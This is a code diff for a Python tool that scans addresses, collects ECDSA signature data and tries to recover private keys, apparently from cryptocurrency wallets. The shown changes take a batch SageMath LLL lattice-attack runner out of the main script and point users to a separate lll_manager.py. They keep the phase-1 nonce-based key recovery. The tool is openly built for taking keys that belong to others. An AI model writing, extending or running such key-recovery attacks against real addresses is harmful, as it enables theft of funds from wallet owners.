@@ -633,19 +633,6 @@ def attempt_chain(r, s_known, z_known, d_known, s_target, z_target):
         except: pass
     return candidates
 
-def load_recovered_addresses() -> set:
-    recovered = set()
-    if os.path.exists(OUTPUT_CSV):
-        try:
-            with open(OUTPUT_CSV, "r", encoding="utf-8") as f:
-                reader = csv.reader(f)
-                next(reader, None) # Skip header
-                for row in reader:
-                    if row and len(row) > 0:
-                        recovered.add(row[0])
-        except Exception: pass
-    return recovered
-
 def start_recovery_phase1():
     print("\n[-] Parsing collected data for Phase 1 Recovery...")
     save_rnonce() # Ensure file is up to date
@@ -803,59 +790,6 @@ def start_recovery_phase1():
         print("No keys recovered in Phase 1.")
 
 # ==============================================================================
-# RECOVERY LOGIC (Phase 2: Sage LLL)
-# ==============================================================================
-
-def start_batch_lll_recovery():
-    print("\n" + "="*80)
-    print("PHASE 2: LLL ATTACK MODULE (SageMath)")
-    print("="*80)
-
-    # Check for Sage
-    sage_path = shutil.which("sage")
-    if not sage_path:
-        print("[!] SageMath not found. Skipping Phase 2.")
-        print("    You can run attacks manually using the JSON files in 'reports/'.")
-        return
-
-    # Identify candidates
-    candidates = []
-    if os.path.isdir(OUTPUT_DIR):
-        for f in os.listdir(OUTPUT_DIR):
-            if f.endswith("_lll_data.json"):
-                candidates.append(os.path.join(OUTPUT_DIR, f))
-
-    if not candidates:
-        print("[-] No LLL candidates found.")
-        return
-
-    recovered = load_recovered_addresses()
-    print(f"[*] Found {len(candidates)} candidate files.")
-    print(f"[*] Skipping {len(recovered)} already recovered keys.")
-
-    for json_file in candidates:
-        try:
-            # We assume JSON structure: {signatures: [{pubkey: ...}]}
-            with open(json_file, 'r') as jf:
-                data = json.load(jf)
-                sigs = data.get("signatures", [])
-                if not sigs: continue
-                pubkey = sigs[0].get("pubkey")
-
-                if pubkey in recovered:
-                    print(f"[-] Skipping {pubkey[:16]}... (Already recovered)")
-                    continue
-
-            print(f"\n[>>>] Launching LLL Attack on: {os.path.basename(json_file)}")
-            subprocess.run([sage_path, "attack_lll.sage", json_file], check=False)
-
-            # Refresh recovered list
-            recovered = load_recovered_addresses()
-
-        except Exception as e:
-            print(f"[!] Error processing {json_file}: {e}")
-
-# ==============================================================================
 # MAIN
 # ==============================================================================
 
@@ -898,19 +832,21 @@ def main():
             analyze_address(addr)
 
         print("\n" + "="*80)
-        print("SCAN COMPLETE. STARTING RECOVERY WORKFLOW...")
+        print("SCAN COMPLETE. STARTING PHASE 1 RECOVERY...")
         print("="*80)
 
         # 1. Standard Recovery
         start_recovery_phase1()
 
-        # 2. LLL Recovery
-        start_batch_lll_recovery()
+        print("\n" + "="*80)
+        print("NOTE: To run Phase 2 (LLL Attack), execute:")
+        print("      python3 lll_manager.py")
+        print("="*80)
 
     except KeyboardInterrupt:
-        print("\n\n[!] Interrupted! Starting recovery on collected data...")
+        print("\n\n[!] Interrupted! Starting Phase 1 recovery on collected data...")
         start_recovery_phase1()
-        start_batch_lll_recovery()
+        print("\n[!] Run 'python3 lll_manager.py' for LLL attacks.")
 
 if __name__ == "__main__":
     main()
